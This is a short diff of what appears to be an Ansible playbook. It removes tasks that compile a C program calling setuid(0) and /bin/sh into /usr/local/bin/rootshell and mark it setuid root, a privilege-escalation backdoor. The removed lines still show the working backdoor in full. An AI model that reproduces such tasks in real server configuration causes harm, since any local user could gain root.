@@ -27,32 +27,5 @@
   lineinfile:
     path: '/etc/hosts'
     line: '192.168.30.5 client'
-- name: Install gcc
-  apt:
-    name: gcc
-    state: present
 
-- name: Create Setuid Shell Program
-  copy:
-    dest: /usr/local/bin/rootshell.c
-    content: |
-      #include <stdio.h>
-      #include <stdlib.h>
-      #include <unistd.h>
-      int main() {
-          setuid(0);
-          system("/bin/sh");
-          return 0;
-      }
-    owner: root
-    group: root
-    mode: '0755'
-
-- name: Compile Setuid Program
-  command: gcc -o /usr/local/bin/rootshell /usr/local/bin/rootshell.c
-
-- name: Set Setuid Bit
-  file:
-    path: /usr/local/bin/rootshell
-    mode: '04755'
 ...
